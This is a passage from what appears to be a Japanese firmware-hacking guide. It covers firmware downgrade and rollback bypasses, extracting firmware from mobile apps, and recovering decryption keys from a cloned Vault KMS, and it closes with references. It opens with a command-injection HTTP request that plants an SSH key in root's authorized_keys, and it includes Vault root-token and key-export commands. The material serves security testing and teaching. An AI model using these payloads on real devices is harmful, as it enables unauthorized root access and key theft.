POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

脆弱な（ダウングレードされた）ファームウェアでは、`md5` パラメータがサニタイズされずにシェルコマンドへ直接連結されるため、任意のコマンドを注入できます（ここでは、SSH鍵によるrootアクセスを有効化しています）。後のファームウェアでは基本的な文字フィルターが導入されましたが、ダウングレード保護がないため、この修正は意味をなしません。<sup>[[4]](#references)</sup>

### モバイルアプリからのファームウェアの抽出

多くのベンダーは、Bluetooth/Wi-Fi経由でアプリからデバイスを更新できるよう、コンパニオンモバイルアプリにファームウェアイメージ全体をバンドルしています。これらのパッケージは、`assets/fw/` や `res/raw/` のようなパスにあるAPK/APEX内に、暗号化されずに保存されていることがよくあります。`apktool`、`ghidra`、あるいは標準の `unzip` などのツールを使えば、物理ハードウェアに触れることなく、署名済みイメージを取り出せます。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/Bスロット設計におけるアップデータ限定のanti-rollback回避

一部のベンダーはanti-downgradeの**ratchet**を実装していますが、それは*アップデータ*のロジック内に限られます（たとえば、CAN経由のUDSルーチン、リカバリーコマンド、ユーザー空間のOTAエージェントなど）。その後、**ブートローダー**がイメージの署名/CRCだけを確認し、パーティションテーブルやスロットメタデータを信頼する場合、rollback protectionは依然として回避される可能性があります。<sup>[[7]](#references)</sup>

典型的な脆弱設計:

- ファームウェアのメタデータに、バージョン記述子と**security ratchet** / 単調増加カウンターの両方が含まれている。
- アップデータは、イメージのratchet値を永続ストレージに保存された値と比較し、古い署名済みイメージを拒否する。
- ブートローダーはそのratchetを**解析せず**、選択されたスロットを起動する前にヘッダー、CRC、署名のみを検証する。
- スロットの有効化情報はパーティションテーブルまたはスロットごとのgeneration counterに別途保存され、検証済みのファームウェアダイジェストに対して**暗号学的に結び付けられていない**。

これにより、デュアルスロットシステムで**一方のイメージを検証して別のイメージを起動する**手段が生まれます。攻撃者が、現在の署名済みイメージを使ってアップデータにスロットBを次回の起動先として設定させ、その後、再起動前にスロットBを上書きできる場合、ブートローダーはコミット済みのスロットメタデータしか信頼しないため、古いイメージを起動する可能性があります。

よくある悪用パターン:

1. **現在の署名済み**ファームウェアを非アクティブスロットにアップロードし、通常の検証/切り替えルーチンを実行して、そのスロットが次のアクティブスロットになるようレイアウトを更新する。
2. **まだ再起動しない**。同じセッション内で、スロット準備/消去ルーチンを再実行する。
3. 古いboot-stateまたはスロット選択ロジックを悪用し、アップデータに、直前に昇格させたものと**同じ物理スロット**を消去させる。
4. そのスロットに、**古いが署名は有効な**ファームウェアを書き込む。
5. ratchetを強制する検証ルーチンをスキップし、直接再起動する。
6. ブートローダーは昇格済みのスロットを選び、署名/整合性だけを検証して古いイメージを起動する。

A/Bアップデート実装をリバースエンジニアリングする際に確認する点:

- スロット選択が、切り替え成功後に更新されない**起動時フラグ**に基づいている。
- `prepare_passive_slot()`のようなルーチンが、**現在コミット済みのレイアウト**ではなく古い状態に基づいてスロットを消去する。
- `part_write_layout()`のような関数が、**generation counter** / アクティブフラグを更新するだけで、検証済みイメージのハッシュを保存しない。
- ratchetチェックがユーザー空間またはアップデータのコードに実装されているが、ROM / ブートローダー / セキュアブートの各段階には**実装されていない**。
- 消去またはリカバリーのルーチンが、スロットの内容を消去して書き換えた後も、そのスロットを起動可能としてマークしたままにする。

### アップデートロジックの評価チェックリスト

* *アップデートエンドポイント*の通信経路/認証は適切に保護されているか（TLS + 認証）？
* 書き込み前に、デバイスは**バージョン番号**または**単調増加するanti-rollbackカウンター**を比較するか？
* イメージはセキュアブートチェーン内で検証されるか（例: ROMコードによる署名チェック）？
* **ブートローダーはアップデータと同じratchetを強制するか**、それとも署名/CRCを確認するだけか？
* スロットの有効化メタデータは**検証済みファームウェアのダイジェスト/バージョンに結び付けられているか**、それとも昇格後にスロットを変更できるか？
* スロット切り替えの成功後、デバイスは強制的に再起動するか、それとも同じセッション内で後続のアップデート/消去ルーチンを実行できるか？
* ユーザーランドのコードは追加の健全性チェック（例: 許可されたパーティションマップ、モデル番号）を実行するか？
* *部分*アップデートや*バックアップ*アップデートのフローは、同じ検証ロジックを再利用しているか？

> 💡  上記のいずれかが欠けている場合、そのプラットフォームはおそらくrollback攻撃に対して脆弱です。

## 練習用の脆弱なファームウェア

ファームウェアの脆弱性発見を練習するには、以下の脆弱なファームウェアプロジェクトを出発点として使用してください。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 組み込みKMS/Vaultの状態からファームウェア復号キーを復元する

アップデートイメージに少量のプレーンテキストメタデータと大きな高エントロピーブロブが混在している場合は、何かをブルートフォースする前にコンテナをトリアージしてください:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`を使って、ヘッダー、オフセット、行境界をダンプする。
- `Salted__`は通常、OpenSSLの`enc`形式を示す。次の8バイトがsaltで、残りが暗号文である。
- `256`バイトにデコードされるBase64フィールドは、ランダムなファームウェアパスワード/セッションキーをラップしたRSA-2048暗号文である可能性が高い。
- 同じファイル内にある分離署名用のPGPデータは、真正性のみを保護している場合が多い。機密性を確保する仕組みだと決めつけないこと。

静的なキー探索（`grep`、`strings`、PEM/PGPの検索）で見つからない場合は、秘密鍵を探すだけでなく、**実際の復号処理経路**をリバースエンジニアリングしてください。

- アップデータ/管理バイナリをデコンパイルし、暗号化されたブロブを読み取る処理、そのラップを解除するヘルパー/API、要求する論理キー名を追跡する。
- 抽出したroot filesystemから、KMSの状態（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）とunitファイル、initスクリプトを探す。
- 平文の`vault operator unseal ...`、リカバリーキー、bootstrap token、ローカルKMSの自動アンシールスクリプトは、秘密鍵の素材と同等のものとして扱う。

アプライアンスに元のVaultバイナリとストレージバックエンドが含まれている場合、Vaultの内部機能を再実装するより、その環境を再現する方がたいてい簡単です:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

クローンした KMS で root 権限を使い、以下を実行します。

- transit key を隔離されたクローン内でのみエクスポート可能にします: `vault write transit/keys/<name>/config exportable=true`
- unwrap key をエクスポートします: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS で使われている正確な padding/hash の組み合わせで試します。PKCS#1 v1.5 による復号の失敗や、デフォルトの OAEP による復号の失敗だけでは、key が間違っているとは証明できません。Vault を使うフローの多くは SHA-256 の OAEP を使いますが、一般的なライブラリのデフォルトは SHA-1 です。
- ペイロードが `Salted__` で始まる場合は、AES-CBC 復号を試す前に、ベンダーの OpenSSL KDF（`EVP_BytesToKey`。古い appliance では MD5 がよく使われます）を正確に再現します。

これにより、「暗号化された firmware」は、より一般的な問題になります。**appliance 側の運用 key を復元し、正確な unwrap + KDF パラメーターをオフラインで再現します。**

## トレーニングと資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で firmware を解読する: シニアレベルのスキル、ジュニアレベルの自律性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware セキュリティテストの方法論](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [実践 IoT hacking: Internet of Things を攻撃するための決定版ガイド](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放置された hardware の zero-day を悪用する – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20 ドルの smart device から自宅へのアクセスを得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [mi が見える今、あなたは Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector の充電ポートコネクターからの悪用 - Part 2: anti-downgrade のバイパス](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [点滅させよう: Philips Hue Bridge の Over-the-Air exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU 上の Tesla OS を ROOT 化 Part 2: デバッグと修正](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [10] [Dell BIOS password: 弱い XOR 暗号化により SPI Flash から復元可能 (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [11] [R3n5k1/dellpwn - Dell BIOS password 復元ツール](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
